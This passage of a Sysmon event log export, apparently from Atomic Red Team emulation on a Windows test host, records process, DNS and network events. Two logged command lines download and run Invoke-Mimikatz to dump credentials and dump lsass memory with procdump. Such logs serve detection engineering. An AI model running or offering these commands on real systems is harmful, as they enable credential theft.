      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">1688</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,cdn-185-199-108-133.github.com,185.199.108.133,false,443,https,3,19560,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,true,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-468d-658c-ae01-000000000f00},3588,7080,,tcp,,,,-,WinDev2309Eval.localdomain,192.168.126.163,false,49971,-,2023-12-27T15:45:20.3524169Z,,3,,5136,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:49:33.181,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>3</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>3</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:20.3524169Z""/>
      
            
      <EventRecordID>19560</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5136""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 14:49:33.181</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-468d-658c-ae01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">7080</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""Protocol"">tcp</Data>
      
            
      <Data Name=""Initiated"">true</Data>
      
            
      <Data Name=""SourceIsIpv6"">false</Data>
      
            
      <Data Name=""SourceIp"">192.168.126.163</Data>
      
            
      <Data Name=""SourceHostname"">WinDev2309Eval.localdomain</Data>
      
            
      <Data Name=""SourcePort"">49971</Data>
      
            
      <Data Name=""SourcePortName"">-</Data>
      
            
      <Data Name=""DestinationIsIpv6"">false</Data>
      
            
      <Data Name=""DestinationIp"">185.199.108.133</Data>
      
            
      <Data Name=""DestinationHostname"">cdn-185-199-108-133.github.com</Data>
      
            
      <Data Name=""DestinationPort"">443</Data>
      
            
      <Data Name=""DestinationPortName"">https</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,22,19559,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-468d-658c-ae01-000000000f00},3588,7080,,,raw.githubusercontent.com,::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;,0,-,,,,,,2023-12-27T15:45:20.2406183Z,,22,,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:49:32.164,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>22</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>22</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:20.2406183Z""/>
      
            
      <EventRecordID>19559</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 14:49:32.164</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-468d-658c-ae01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">7080</Data>
      
            
      <Data Name=""QueryName"">raw.githubusercontent.com</Data>
      
            
      <Data Name=""QueryStatus"">0</Data>
      
            
      <Data Name=""QueryResults"">::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 15:45:17.134,,,,,,,,11,19558,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-468d-658c-ae01-000000000f00},3588,7080,,,,,,-,,,,,,2023-12-27T15:45:17.1388978Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_ppfx5egq.r4w.ps1,11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:45:17.134,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>11</EventID>
      
            
      <Version>2</Version>
      
            
      <Level>4</Level>
      
            
      <Task>11</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:17.1388978Z""/>
      
            
      <EventRecordID>19558</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:45:17.134</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-468d-658c-ae01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">7080</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_ppfx5egq.r4w.ps1</Data>
      
            
      <Data Name=""CreationUtcTime"">2023-12-27 15:45:17.134</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,1,19557,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-468d-658c-ae01-000000000f00},3588,7080,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T15:45:17.0239641Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:45:17.022,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:17.0239641Z""/>
      
            
      <EventRecordID>19557</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:45:17.022</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-468d-658c-ae01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">7080</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows PowerShell</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      
            
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds}</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">1688</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\procdump.exe"" -accepteula -mm lsass.exe C:\Windows\Temp\lsass_dump.dmp",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,,,,,,1,19556,10.0.22621.2506 (WinBuild.160101.0800),"MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,Cmd.Exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-468c-658c-ac01-000000000f00},3588,10296,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T15:45:16.7909856Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:45:16.789,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:16.7909856Z""/>
      
            
      <EventRecordID>19556</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:45:16.789</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-468c-658c-ac01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10296</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows Command Processor</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      
            
      <Data Name=""CommandLine"">""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\procdump.exe"" -accepteula -mm lsass.exe C:\Windows\Temp\lsass_dump.dmp</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">1688</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,22,19555,,,<unknown process>,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-4689-658c-aa01-000000000f00},3588,4824,,,raw.githubusercontent.com,::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;,0,-,,,,,,2023-12-27T15:45:16.6625040Z,,22,,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:49:29.260,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>22</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>22</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:16.6625040Z""/>
      
            
      <EventRecordID>19555</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 14:49:29.260</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4689-658c-aa01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">4824</Data>
      
            
      <Data Name=""QueryName"">raw.githubusercontent.com</Data>
      
            
      <Data Name=""QueryStatus"">0</Data>
      
            
      <Data Name=""QueryResults"">::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;</Data>
      
            
      <Data Name=""Image"">&lt;unknown process&gt;</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
